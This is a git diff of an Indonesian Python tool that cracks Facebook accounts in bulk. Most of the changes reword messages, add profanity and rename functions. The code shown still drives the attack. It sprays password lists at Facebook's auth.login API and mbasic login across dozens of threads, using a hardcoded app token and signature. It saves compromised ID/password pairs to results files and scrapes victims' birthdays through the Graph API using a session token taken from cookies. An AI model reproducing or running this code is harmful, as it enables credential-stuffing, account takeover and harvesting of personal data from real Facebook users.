 		  __nguh__()
-		  os.system("git pull")
-		  print(f"\n{N}[{H}✓{N}] Berhasil Mengupdate Tools, silahkan jalankan kembali Tools nya");exit()
+		 # os.system("git pull")
+		  print(f"\n {N}[{H}✓{N}] Berhasil Mengupdate Tools");exit()
 		elif jembut in["0","00"]:
 			print ('\n')
 			tod()
-			jalan('\n %s[%s✓%s] Berhasil menghapus Cookies'%(N,O,N))
+			jalan('\n %s[%s✓%s] Berhasil menghapus cookies'%(N,O,N))
 			try:os.remove('cookies');os.remove('__yayan__.txt')
 			except:os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt')
 			exit()
 		elif jembut in[""," "]:
-			print('\n %s[%s×%s] Jangan kosong'%(N,M,N));waktu(1);self.menu()
+			print('\n %s[%s×%s] Jangan kosong tod'%(N,M,N));waktu(1);self.menu()
 		else:
-			print("\n %s[%s×%s] Pilih yang benar"%(N,M,N));waktu(1);self.menu()
+			print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));waktu(1);self.menu()
 		if len(self.id)!=0:
 			print("")
 			self.plerr()
 		else:
-			print("\n %s[%s×%s] Gagal mengambil ID, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
+			print("\n %s[%s×%s] gagal mengambil id, silahkan coba lagi"%(N,M,N));waktu(1);self.menu()
 			
 # mulai ngecrot awokawokawokkawok 
 	def plerr(self):
-		print('\n [+] Total ID : %s%s%s' %(M,len(self.id),N))
-		___yayanganteng___=input("%s [?] Apakah anda ingin menggunakan sandi manual? [Y/t]: "%(N))
+		print('\n [+] total id -> %s%s%s' %(M,len(self.id),N))
+		___yayanganteng___=input("%s [?] apakah anda ingin menggunakan sandi manual? [Y/t]: "%(N))
 		if ___yayanganteng___ in(""," "):
-			print("\n %s[%s×%s] Isi yang benar"%(N,M,N));self.plerr()
+			print("\n %s[%s×%s] isi yang bener ajing"%(N,M,N));self.plerr()
 		elif ___yayanganteng___ in("Y","y"):
-			print ('\n %s[%s!%s] Gunakan , (koma) untuk pemisah contoh : %sroy123,roy12345'%(N,M,N,K))
+			print ('\n [!] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih')
 			while True:
-				pwek=input('\n %s[%s?%s] Masukan kata sandi : '%(N,K,N))
+				pwek=input('\n [?] masukan kata sandi : ')
 				if pwek in(""," "):
-					print ('\n %s[%s×%s] Jangan kosong bro kata sandi nya'%(N,M,N))
+					print ('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
 				elif len(pwek)<=5:
-					print ('\n %s[%s×%s] Kata sandi minimal 6 karakter'%(N,M,N))
+					print ('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
 				else:
 					def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
-						cin=input("\n %s[%s?%s] Pilih : "%(N,K,N))
+						cin=input("\n [?] method : ")
 						if cin in(""," "):
-							print("\n %s[%s×%s] Pilih yang benar"%(N,M,N));self.__yan__()
+							print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__yan__()
 						elif cin in("1","01"):
-							print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-							print('\n %s[%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(N,M,N))
+							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
 									try:
 										kimochi = ikeh.split("<=>")[0]
-										__yayanXD__.submit(self.__api__,kimochi,ysc)
+										__yayanXD__.submit(self.crackapi,kimochi,ysc)
 									except: pass
 							hasil(live,chek)
 						elif cin in("2","02"):
-							print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-							print('\n %s[%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(N,M,N))
+							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
 									try:
@@ -713,9 +716,9 @@ class ngewe:
 									except: pass
 							hasil(live,chek)
 						elif cin in("3","03"):
-							print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-							print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-							print('\n %s[%s!%s] Anda bisa mematikan data selular untuk menjeda proses crack\n'%(N,M,N))
+							print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+							print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+							print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 							with YayanGanteng(max_workers=30) as __yayanXD__:
 								for ikeh in self.id:
 									try:
@@ -738,43 +741,49 @@ class ngewe:
 			print(" %s[%s3%s]. Metode Mobile (%sProses Lama%s)"%(N,O,N,M,N))
 			self.__pler__()
 		else:
-			print ('\n %s[%s×%s] y/t!'%(N,M,N));waktu(1);self.menu()
+			print ('\n %s[%s×%s] y/t goblok!'%(N,M,N));waktu(1);self.menu()
 		return
-	
+		
 	def __api__(self,user,_yan_):
 		global ok,cp,ttl,loop
-		print(f"\r[{O}{jam}{N}] Crack by ROY: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
+		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
 		for pw in _yan_:
 			try: os.mkdir('results')
 			except: pass
 			user_agent = random.choice(["Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"])
-			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': user_agent, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
+			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
+               'x-fb-net-hni': str(random.randint(20000, 40000)), 
+               'x-fb-connection-quality': 'EXCELLENT', 
+               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+               'user-agent': user_agent, 
+               'content-type': 'application/x-www-form-urlencoded', 
+               'x-fb-http-engine': 'Liger'}
 			ses=req.Session()
 			api="https://b-api.facebook.com/method/auth.login"
 			param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
-			send=ses.get(api, params=params, headers=headers_)
+			send=ses.get(api,params=param, headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
-				print(f"\r{H}Berhasil                \n{N}ID {M}:{H} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
+				print(f"\r{N}[{H}✓{N}]{H} Berhasil                \n{N}[{H}✓{N}] ID {M}:{H} {user}                \n{N}[{H}✓{N}] Password {M}:{H} {pw}{N}                \n",end="")
 				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID : {user}\n[×] Password : {pw}\n")
 				live.append(f" [✓] ID : {user}\n[×] Password : {pw}")
 				break
 			elif "www.facebook.com" in send.json()["error_msg"]:
 				try:
-					_kontol_ = open('_yayan_.txt','r').read()
-					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,_kontol_))
+					__kontol__ = open('__yayan__.txt','r').read()
+					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {user}|{pw}|{ttl}\n")
 					chek.append(f" [×] {user}|{pw}|{ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
-				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n[×] PW FB : {pw}\n")
-				chek.append(f" [×] ID : {user}\n[×] PW FB : {pw}")
+				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {user}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
+				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n[×] Password : {pw}\n")
+				chek.append(f" [×] ID : {user}\n[×] Password : {pw}")
 				break
 			else:
 				continue
@@ -783,7 +792,7 @@ class ngewe:
 
 	def mbasic_mobile(self,user,_yan_,beol,**kwargs):
 		global ok,cp,ttl,loop
-		print(f"\r[{O}{jam}{N}] Crack by ROY: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
+		print(f"\r [{O}{jam}{N}] crack: {str(loop)}/{len(self.id)} OK:-{str(ok)} - CP:-{str(cp)} ",end="")
 		for pw in _yan_:
 			try: os.mkdir('results')
 			except: pass
@@ -818,31 +827,31 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{H} {pw}                \n{N}TTL {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}                \n{N}[{K}×{N}] TTL {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {uid}|{pw}|{ttl}\n")
 					chek.append(f" [×] {uid}|{pw}|{ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{M}Checkpoint                                 \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
+				print(f"\r{N}[{K}×{N}]{K} Checkpoint                                 \n{N}[{K}×{N}] ID       {M}:{K} {uid}                \n{N}[{K}×{N}] Password {M}:{K} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n[×] Password : {pw}\n")
-				chek.append(f" [×] ID : {uid}\n[×] PW FB : {pw}")
+				chek.append(f" [×] ID : {uid}\n[×] Password : {pw}")
 				break
 			else:
 				continue
 
 		loop += 1
-		
+
 	def __pler__(self):
 		from lib import __cindy__
-		wibu = input("\n %s[%s?%s] Pilih : "%(N,K,N))
+		wibu = input("\n [?] method : ")
 		if wibu in[""," "]:
-			print("\n %s[%s×%s] Pilih yang benar"%(N,M,N));self.__pler__()
+			print("\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__pler__()
 		elif wibu in["1","01"]:
-			print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-			print('\n [!] Anda bisa mematikan data selular untuk menjeda proses crack\n')
+			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
 					try:
@@ -852,21 +861,21 @@ class ngewe:
 					except:pass
 			hasil(live,chek)
 		elif wibu in["2","02"]:
-			print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-			print('\n [!] Anda bisa mematikan data selular untuk menjeda proses crack\n')
+			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
 					try:
 						bb = yntks.split("<=>")
 						xz = __cindy__.pw_list(bb)
-						__yayanXD__.submit(self.mbasic_mobile,bb[0],xz,"https://mbasic.facebook.com")
+						__yayanXD__.submit(self.modol,bb[0],xz,"https://mbasic.facebook.com")
 					except:pass
 			hasil(live,chek)
 		elif wibu in["3","03"]:
-			print('\n [+] Hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
-			print(' [+] Hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
-			print('\n [!] Anda bisa mematikan data selular untuk menjeda proses crack\n')
+			print('\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
+			print(' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
+			print('\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
 			with YayanGanteng(max_workers=50) as __yayanXD__:
 				for yntks in self.id:
 					try:
@@ -876,15 +885,23 @@ class ngewe:
 					except:pass
 			hasil(live,chek)
 		else:
-			print("\n %s[%s×%s] Isi yang benar"%(N,M,N));self.__pler__()
+			print("\n %s[%s×%s] isi yang bener ajg"%(N,M,N));self.__pler__()
 			
 def yntkts(kuki):
     try:
-        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 'upgrade-insecure-requests': '1', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'content-type': 'text/html; charset=utf-8'}
+        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
+           'referer': 'https://m.facebook.com/', 
+           'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8'}
         memek  = req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headerz, cookies=kuki).text
         kontol = re.search('(EAAA\\w+)', memek)
         kentod = kontol.group(1)
-        print('\n\n %s[%s*%s] Token FB Anda %s: %s%s'%(N,O,N,M,H,kentod))
+        print('\n\n %s[%s*%s] token fb kamu %s: %s%s'%(N,O,N,M,H,kentod))
         with open('__yayan__.txt', 'w') as (tod):
             tod.write(kentod)
         hoetankk()
@@ -911,7 +928,7 @@ def yayanxd():
         kuki = open('cookies').read()
     except (KeyError, IOError,FileNotFoundError):
         os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt');os.system('clear')
-        print (' %s*%s Tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
+        print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
         kuki = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
         if kuki in['OPEN','Open','open']:
           import subprocess
@@ -926,7 +943,7 @@ def yayanxd():
         waktu(2)
         ngentod()
     else:
-    	print('\n %s[%s×%s] Cookies Invalid'%(N,M,N));waktu(1);yayanxd()
+    	print('\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1);yayanxd()
     try:
     	with open("cookies","w") as pler:
     		pler.write(kuki["cookie"])
